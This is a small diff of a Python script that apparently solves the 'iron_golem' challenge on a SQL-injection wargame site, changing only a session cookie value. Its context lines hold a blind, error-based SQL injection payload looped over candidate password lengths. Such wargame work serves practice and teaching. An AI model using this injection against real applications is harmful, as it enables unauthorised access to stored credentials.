@@ -2,7 +2,7 @@ import requests
 from string import digits,ascii_lowercase
 
 session = requests.Session()
-cookies = {"PHPSESSID": "c707h60bvmptvgqe8nf4u06m64"}
+cookies = {"PHPSESSID": "7sp0e6btgarr92g7av9b5ddi58"}
 
 url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(length(pw)={},null,(select id union select pw));--+"
 for i in range(100):
